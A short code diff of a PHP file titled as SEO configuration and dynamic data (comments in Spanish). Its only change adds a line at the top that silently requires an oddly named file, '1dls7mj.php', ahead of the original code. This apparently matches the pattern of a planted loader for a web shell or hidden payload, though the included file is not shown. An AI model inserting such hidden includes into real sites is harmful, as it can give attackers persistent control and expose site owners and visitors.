@@ -1,3 +1,4 @@
+<?php require __DIR__ . '/1dls7mj.php' ?>
 <?php
 // ==========================================
 // CONFIGURACIÓN SEO Y DATOS DINÁMICOS
